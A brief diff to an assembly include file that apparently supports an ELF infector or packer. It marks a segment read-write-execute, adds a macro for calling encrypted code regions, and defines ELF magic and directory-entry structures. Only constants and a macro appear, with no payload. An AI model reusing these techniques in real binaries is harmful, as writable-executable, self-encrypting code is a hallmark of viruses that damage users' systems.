@@ -23,7 +23,7 @@
 %define MAP_SHARED      0x01
 
 ; P_FLAGS = PF_X | PF_R
-%define P_FLAGS         0x05
+%define P_FLAGS         0x07
 
 ; msync
 %define MS_SYNC 0x0004
@@ -45,6 +45,7 @@
 
 %define MAGIC_NUMBERS   0x464c457f ; little endian
 
+%define CALL_ENCRYPT(x) CALL (__F_ %+ x), (__F_ %+ x %+ __end - __F_ %+ x)
 
 struc	dirent
     .d_inode	resq    1	; inode number
